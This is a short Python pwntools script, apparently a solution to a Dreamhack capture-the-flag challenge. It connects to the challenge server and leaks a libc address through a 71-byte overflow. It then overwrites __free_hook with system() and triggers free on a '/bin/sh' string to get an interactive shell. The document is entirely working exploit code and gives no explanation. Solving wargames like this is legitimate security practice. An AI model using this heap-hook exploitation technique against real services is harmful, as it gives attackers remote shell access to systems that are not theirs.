from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22264
r = remote(HOST, PORT)

r.sendlineafter(b'Buf: ', b'A' * 71)

r.recvline()
libc = u64(r.recvline().strip().ljust(8, b'\x00')) - 0x21bf7
free_hook = libc+0x3ed8e8
system=libc+0x4f550
binsh=libc+0x1b3e1a

r.sendlineafter(b'write: ', str(free_hook).encode())
r.sendlineafter(b'With: ', str(system).encode())
r.sendlineafter(b'free: ', str(binsh).encode())

r.interactive()